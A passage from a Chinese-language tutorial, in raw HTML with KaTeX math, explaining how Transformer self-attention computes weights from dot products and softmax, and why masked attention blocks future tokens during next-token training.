xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>×</mo><mo stretchy="false">(</mo><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo><mo>+</mo><mn>3</mn><mo>×</mo><mn>1</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1 \times (-2) + 3 \times 1 = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">−</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>，计算结果是一个标量，其实就是逐元素相乘后在加起来。那么向量点积的数学意义是什么呢？点积的结果是一个标量，它在几何上反映了两个向量在方向上的对齐程度：方向越接近，值越大；方向越接近正交，值越接近零；方向相反则为负值。因此，<strong>点积可以自然地作为两个向量相似性的一种度量</strong>。</p>
<p>那么，计算注意力权重的思路就清晰了：我们可以用 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 与序列中每个向量（包括自身）的点积，来初步衡量它们之间的相似度：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>⋅</mo><msub><mi>x</mi><mn>1</mn></msub><mo>=</mo><mn>3.41</mn><mspace linebreak="newline"/><msub><mi>p</mi><mn>2</mn></msub><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>⋅</mo><msub><mi>x</mi><mn>2</mn></msub><mo>=</mo><mn>0.19</mn><mspace linebreak="newline"/><msub><mi>p</mi><mn>3</mn></msub><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>⋅</mo><msub><mi>x</mi><mn>3</mn></msub><mo>=</mo><mn>2.04</mn><mspace linebreak="newline"/><mi>q</mi><mo>=</mo><mtext>softmax</mtext><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_{1} = x_{1} \cdot x_{1} = 3.41
\\ p_{2} = x_{1} \cdot x_{2} = 0.19
\\ p_{3} = x_{1} \cdot x_{3} = 2.04
\\ q = \text{softmax}(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">3.41</span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.19</span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">2.04</span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">softmax</span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></div>
<p>最终，我们便得到了用于加权求和的注意力权重 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span>。这个过程直观上就是：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的生成，是基于“<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 与序列中每个元素相似度”所决定的注意力分配。 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">y_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">y_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的生成过程完全同理，只是分别以 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 作为查询的中心。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee96cecb211f46bdb9ff8042626f44c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=7jh7bLBUkPUVo1ejsQgrsBSCMuE%3D" alt="c6.jpg" width="100%" loading="lazy"/></p>
<p>最后，我们再回过头看到那个输出矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>，其中的每一个向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 都是序列信息融合后的结果，它代表了一种以自身为视角、对整个序列的注意力聚焦。</p>
<p>以上我们讲解了标准的注意力计算过程，它让序列中的每个词都能“看到”整个序列的所有信息。然而，这种“全知视角”在<strong>序列生成任务</strong>（如对话、文本创作）中却会带来一个根本性问题——信息泄漏。</p>
<p>一部精彩的悬疑电影之所以吸引人，在于观众和主角一样，对未来的剧情一无所知，只能根据已呈现的线索进行推测和期待。如果观众提前知道了凶手是谁（即获得了“未来信息”），那么整个观影的推理过程和悬念就荡然无存。Transformer 在生成文本时也是如此：它应该像一个“实时编剧”，只能基于<strong>已经写出的剧情</strong>来构思下一句话。</p>
<p>从技术视角看，问题具体何在？我们以训练一个极简版 ChatGPT 来生成 “I Love Apple” 这句话为例。在训练时，我们会将完整的句子输入模型，并让模型学习预测下一个词：</p>
<ul>
<li>当模型看到 <code>“I”</code> 时，它应该学习预测 <code>“Love”</code>。</li>
<li>当模型看到 <code>“I Love”</code> 时，它应该学习预测 <code>“Apple”</code>。</li>
</ul>
<p>关键在于，在标准注意力下，计算 <code>“Love”</code> 这个词的表示 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">y_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 时，它会与包括 <code>“Apple”</code> (<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>) 在内的所有词计算注意力。这意味着，<strong>模型在训练预测 <code>“Love”</code> 的下一个词时，已经“偷看”到了答案 <code>“Apple”</code></strong>。这就像考试时直接把标准答案放在考卷上，模型无需费力“思考”和“推理”，只需简单地将注意力高度集中在下一个词上即可。这种数据泄漏会导致模型无法学会真正的语言建模能力。</p>
<p>那么，如何为模型戴上“眼罩”，屏蔽未来的信息呢？解决方案就是 <strong>掩码注意力（Masked Attention）</strong>。</p>
<p>其核心思想非常直观：<strong>在计算某个位置的输出时，只允许它关注该位置之前（包括自身）的所有位置</strong>。具体来说：</p>
<ul>
<li>计算  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>  (对应 <code>“I”</code>) 时，只允许关注 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></li>
<li>计算  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">y_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>  (对应 <code>“Love”</code>) 时，只允许关注 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_{1},x_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></li>
<li>计算  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">y_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>  (对应 <code>“Apple”</code>) 时，才允许关注全部 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">x_{1},x_{2},x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></li>
</ul>
<p>如何实现这种屏蔽？很简单，没有你想象的那么复杂，保持之前所有的算法步骤不变，你想屏蔽谁，就把谁的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">p</span></span></span></span></span>置为负无穷，这样它在经过softmax后，对应的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span>自然就变成0了。</p>
<hr/>
